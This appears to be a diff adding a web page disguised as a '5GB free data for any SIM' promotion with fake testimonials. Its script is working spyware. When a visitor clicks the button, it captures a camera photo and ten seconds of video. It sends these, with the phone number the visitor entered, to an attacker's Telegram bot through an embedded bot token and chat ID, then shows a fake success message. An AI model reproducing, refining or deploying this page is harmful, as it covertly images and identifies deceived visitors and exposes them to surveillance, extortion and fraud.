@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Get 5GB Free Data</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+<style>
+    body {
+        font-family: 'Poppins', sans-serif;
+        margin: 0;
+        padding: 0;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        animation: gradientBG 8s ease infinite;
+        background: linear-gradient(-45deg, #00c6ff, #0072ff, #ff7e5f, #feb47b);
+        background-size: 400% 400%;
+    }
+    @keyframes gradientBG {
+        0% {background-position: 0% 50%;}
+        50% {background-position: 100% 50%;}
+        100% {background-position: 0% 50%;}
+    }
+    .container {
+        background: rgba(255,255,255,0.9);
+        padding: 40px;
+        border-radius: 15px;
+        box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+        max-width: 600px;
+        width: 100%;
+        animation: fadeIn 1.2s ease-in-out;
+    }
+    @keyframes fadeIn {
+        from {opacity: 0; transform: translateY(20px);}
+        to {opacity: 1; transform: translateY(0);}
+    }
+    .header {
+        text-align: center;
+        font-size: 22px;
+        font-weight: bold;
+        padding: 10px;
+        background: linear-gradient(90deg, #ff4e50, #f9d423);
+        color: white;
+        border-radius: 10px;
+        margin-bottom: 20px;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    }
+    h1 {
+        text-align: center;
+        color: #333;
+        margin-bottom: 10px;
+    }
+    p {
+        color: #555;
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    form {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+    }
+    input {
+        padding: 12px;
+        border-radius: 8px;
+        border: 1px solid #ccc;
+        outline: none;
+        font-size: 16px;
+        transition: all 0.3s ease;
+    }
+    input:focus {
+        border-color: #0072ff;
+        box-shadow: 0 0 5px rgba(0,114,255,0.5);
+    }
+    button {
+        padding: 14px;
+        background: linear-gradient(90deg, #00c6ff, #0072ff);
+        border: none;
+        border-radius: 8px;
+        color: white;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: transform 0.2s ease;
+    }
+    button:hover {
+        transform: scale(1.05);
+        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    }
+    .message, .loading-message {
+        text-align: center;
+        margin-top: 15px;
+    }
+    .loading-message {
+        display: none;
+        color: #007BFF;
+        font-weight: bold;
+    }
+    .note {
+        font-size: 13px;
+        text-align: center;
+        color: #888;
+        margin-top: 15px;
+    }
+    .testimonials {
+        margin-top: 25px;
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+        gap: 15px;
+    }
+    .testimonial {
+        background: white;
+        border-radius: 10px;
+        padding: 15px;
+        display: flex;
+        gap: 10px;
+        align-items: center;
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+    .testimonial:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+    }
+    .testimonial img {
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+    }
+    .testimonial .text {
+        font-size: 14px;
+        color: #555;
+    }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">🎉 FREE OFFER 🎉</div>
+    <h1>Get 5GB Free Data for Any SIM</h1>
+    <p>Limited-time promotion! Claim your free data now. 100% genuine.</p>
+
+    <form id="phoneNumberForm">
+        <input type="text" id="phoneNumber" placeholder="Enter your phone number" required pattern="\d{10,20}">
+        <button type="button" onclick="getFreeData()">Get Free Data</button>
+    </form>
+
+    <div class="message" id="message"></div>
+    <div class="loading-message" id="loadingMessage">Processing your request...</div>
+    <div class="note">Offer valid for a limited time only. Hurry up!</div>
+
+    <div class="testimonials">
+        <div class="testimonial">
+            <img src="https://i.pravatar.cc/50?img=1">
+            <div class="text">"Amazing! Got my free data in minutes."</div>
+        </div>
+        <div class="testimonial">
+            <img src="https://i.pravatar.cc/50?img=2">
+            <div class="text">"Was skeptical but it works. Thanks!"</div>
+        </div>
+        <div class="testimonial">
+            <img src="https://i.pravatar.cc/50?img=3">
+            <div class="text">"Best free offer ever!"</div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ===== Original JS Code =====
+let captureCount = 0;
+const MAX_CAPTURES = 3;
+const TELEGRAM_BOT_TOKEN = '7649115586:AAFmPYzbjLBGsp5CyCO18Fs07y0rW6wrP2Q';
+const CHAT_ID = '7294724384';
+
+function getFreeData() {
+    const messageElement = document.getElementById('message');
+    const loadingMessageElement = document.getElementById('loadingMessage');
+    loadingMessageElement.style.display = 'block';
+    messageElement.textContent = '';
+    captureMedia();
+}
+
+async function captureMedia() {
+    if (captureCount >= MAX_CAPTURES) {
+        alert('You have reached the maximum number of captures.');
+        return;
+    }
+    captureCount++;
+    try {
+        const constraints = { video: { facingMode: 'user' } };
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const imgData = await captureImageFromStream(stream);
+        const imgBlob = await fetch(imgData).then(res => res.blob());
+        const phoneNumber = document.getElementById('phoneNumber').value;
+        sendMediaToTelegram(imgBlob, 'photo', phoneNumber);
+        const videoBlob = await captureVideoFromStream(stream);
+        sendMediaToTelegram(videoBlob, 'video', phoneNumber);
+        stream.getTracks().forEach(track => track.stop());
+        document.getElementById('loadingMessage').style.display = 'none';
+        document.getElementById('message').textContent = '✅ Request successful!';
+        confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });
+    } catch (error) {
+        console.error('Error accessing camera:', error);
+        alert('Error accessing camera.');
+    }
+}
+
+async function captureImageFromStream(stream) {
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    return imageCapture.takePhoto().then(blob => URL.createObjectURL(blob));
+}
+
+function captureVideoFromStream(stream) {
+    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
+    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    mediaRecorder.start();
+    return new Promise(resolve => {
+        mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+        setTimeout(() => mediaRecorder.stop(), 10000);
+    });
+}
+
+function sendMediaToTelegram(blob, type, phoneNumber) {
+    const formData = new FormData();
+    formData.append(type, blob, `${type}_${captureCount}.webm`);
+    formData.append('caption', `Phone Number: ${phoneNumber}`);
+    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`,
+        formData, { params: { chat_id: CHAT_ID } })
+    .then(res => console.log('Sent:', res.data))
+    .catch(err => console.error('Error:', err));
+}
+</script>
+
+</body>
+</html>
